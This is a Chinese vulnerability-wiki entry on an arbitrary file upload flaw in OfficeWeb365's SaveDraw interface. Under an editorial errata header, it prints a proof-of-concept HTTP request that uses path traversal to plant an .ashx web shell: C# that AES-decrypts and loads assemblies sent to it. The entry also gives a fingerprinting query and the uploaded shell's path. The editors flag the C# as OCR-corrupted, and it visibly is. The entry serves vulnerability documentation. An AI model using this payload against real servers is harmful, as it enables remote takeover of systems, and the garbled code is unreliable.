---
source: "Threekiii/Vulnerability-Wiki"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "OfficeWeb365-SaveDraw-任意文件上传漏洞"
product: "OfficeWeb365 SaveDraw"
record_type: "vulnerability"
document_type: "文件上传请求转存"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "/PW/SaveDraw的path遍历与idx扩展名；服务器可写目录并解析ASHX；鉴权/版本未给"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%A1%8C%E9%9D%A2%E8%BD%AF%E4%BB%B6/OfficeWeb/OfficeWeb365-SaveDraw-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "missing"
source_note: "原始出处待补；仓库归档不等同原始披露"
id: "vw-71b8b3fc11f9b45393e01b75"
entity_id: "ve-a2f0e337b9bdc9a6caeb81f5"
schema_version: "1"
canonical: "Web安全/OA办公/OfficeWeb365/OfficeWeb365 SaveDraw 任意文件上传漏洞.md"
relation_type: "duplicate_of"
---

# OfficeWeb365-SaveDraw-任意文件上传漏洞

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：OfficeWeb365 SaveDraw
- 文献类型：文件上传请求转存
- 版本、权限及部署边界：/PW/SaveDraw的path遍历与idx扩展名；服务器可写目录并解析ASHX；鉴权/版本未给
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 与OfficeWeb365目录另一篇同一SaveDraw路径/载荷前缀，产品目录应归一而非两独立漏洞
2. C#片段明显转码/OCR损坏：System.I0、using&、byteDk、context.Session.AddC、sr.ReadLine缺调用等，不能作为可执行PoC
3. Host空且Content-Length固定，data:image/png;base64前缀后实际混C#不是合法纯base64，需要原始协议解码机制
4. 只给输出路径与截图，没有有效上传/执行文本证据；版本仅产品名、无厂商公告/修复版本
5. 任意文件上传到代码执行依赖ASP.NET处理器与文件权限，实际Web服务非桌面Office

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文参考链接（未重新核验）：<https://github.com/Threekiii/Vulnerability-Wiki>
- 原始披露 URL 未确认；既有归档来源标签保留，不能替代原始公告

### 归档技术正文

## 漏洞描述

OfficeWeb365 SaveDraw 接口存在任意文件上传漏洞，攻击者通过漏洞可以在服务器中上传任意文件获取服务器权限

## 漏洞影响

OfficeWeb365

## 网络测绘

```
"OfficeWeb365"
```

## 漏洞复现

产品页面

![image-20230828143123592](./.resource/OfficeWeb365-SaveDraw-任意文件上传漏洞/media/image-20230828143123592.png)

验证POC

```
POST /PW/SaveDraw?path=../../Content/img&idx=6.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.434.18 Safari/537.36
Content-Length: 990
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close

data:image/png;base64,01s34567890123456789y12345678901234567m91<%@ WebHandler Language="C#" Class="Handler" %>using System;using System.I0;using System.Reflection;using System.Text;using System.Web;using System.WebSessionState;using&System.Security.Cryptography;public class Handler : IHttpHandler,IRequiresSessionState{public void=&ProcessRequest(HttpContext context){try{string key="900bc885d7553375";byteDk=&Encoding.Default.GetBytes(key);context.Session.AddC"sky", key);StreamReader sr=new&StreamReader(contextRequest.InputStream);string line=sr.ReadLine;if(!string.IsNullOrEmpty(line)){byteDc=&Convert.FromBase64String(line);Assembly assembly=&typeof(Environment).Assembly;RijndaelManaged rm=(RijndaelManaged)&assembly.CreateInstance("System.Secur"+"ityCrypto"+"graphy.Rijnda"+"elm anaged");byte[ data=rm.CreateDecryptorCk,k)TransformFinalBlock(c,0, c.Length);Assembly.Load(data)CreateInstance("U").Equals(context);sr.clo se();}}catch {}}public bool IsReusable{get{return false;}}}}---
```

![image-20230828143155818](./.resource/OfficeWeb365-SaveDraw-任意文件上传漏洞/media/image-20230828143155818.png)

上传地址

```
/Content/img/UserDraw/drawPW6.ashx
```

---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
